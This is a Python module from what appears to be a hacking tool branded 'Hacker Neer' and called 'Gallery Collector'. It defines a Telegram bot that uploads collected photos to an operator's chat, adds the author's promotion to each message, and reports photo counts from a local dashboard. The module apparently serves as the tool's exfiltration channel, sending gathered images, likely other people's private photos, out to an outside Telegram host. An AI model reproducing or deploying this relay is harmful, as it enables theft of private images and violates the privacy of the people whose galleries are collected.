#!/usr/bin/env python3
import os
import json
import requests
import time
from datetime import datetime
import threading

class TelegramBot:
    def __init__(self, config_file='config.json'):
        with open(config_file, 'r') as f:
            config = json.load(f)
        
        self.token = config['telegram']['bot_token']
        self.chat_id = config['telegram']['chat_id']
        self.enabled = config['telegram']['enabled']
        self.base_url = f"https://api.telegram.org/bot{self.token}"
        self.credit = config.get('credit', {
            'name': 'Hacker Neer',
            'youtube': 'https://youtube.com/@hackerneer',
            'channel_id': '@hackerneer'
        })
        
        self.failed_queue = []
        self.lock = threading.Lock()
    
    def send_photo(self, photo_path, caption=""):
        """Send photo to Telegram"""
        if not self.enabled:
            return False
        
        try:
            if not os.path.exists(photo_path):
                return False
            
            # Add credit if not in caption
            if "Hacker Neer" not in caption:
                caption += f"\n\n━━━━━━━━━━━━━━━━━━━━━\n🔥 *Tool By:* {self.credit['name']}\n📺 *YouTube:* {self.credit['channel_id']}\n🔗 *Link:* {self.credit['youtube']}\n━━━━━━━━━━━━━━━━━━━━━"
            
            url = f"{self.base_url}/sendPhoto"
            
            with open(photo_path, 'rb') as photo:
                files = {'photo': photo}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption,
                    'parse_mode': 'Markdown'
                }
                
                response = requests.post(url, files=files, data=data, timeout=30)
                
                if response.status_code == 200:
                    print(f"✅ Photo sent to Telegram: {os.path.basename(photo_path)}")
                    return True
                else:
                    print(f"❌ Telegram error: {response.text}")
                    return False
                    
        except Exception as e:
            print(f"❌ Telegram send error: {e}")
            return False
    
    def send_message(self, text):
        """Send text message with credit"""
        try:
            if "Hacker Neer" not in text:
                text += f"\n\n━━━━━━━━━━━━━━━━━━━━━\n🔥 Tool By: {self.credit['name']}\n📺 YouTube: {self.credit['channel_id']}"
            
            url = f"{self.base_url}/sendMessage"
            data = {
                'chat_id': self.chat_id,
                'text': text,
                'parse_mode': 'Markdown'
            }
            response = requests.post(url, data=data, timeout=30)
            return response.status_code == 200
        except:
            return False
    
    def send_stats(self):
        """Send statistics with credit"""
        try:
            # Get stats from server
            response = requests.get('http://localhost:5000/api/stats', timeout=5)
            if response.status_code == 200:
                stats = response.json()
                if stats.get('success'):
                    message = f"""
📊 *Gallery Collector Stats*

📸 *Total Photos:* {stats.get('total_photos', 0)}
💾 *Total Size:* {stats.get('total_size_mb', 0)} MB
⏱️ *Last Update:* {datetime.now().strftime('%H:%M:%S')}

🔗 *Dashboard:* http://localhost:5000/dashboard

━━━━━━━━━━━━━━━━━━━━━
🔥 *Tool By:* Hacker Neer
📺 *YouTube:* @hackerneer
━━━━━━━━━━━━━━━━━━━━━
                    """
                    return self.send_message(message)
            return False
        except:
            return False
    
    def send_notification(self, title, message):
        """Send notification"""
        return self.send_message(f"🔔 *{title}*\n\n{message}")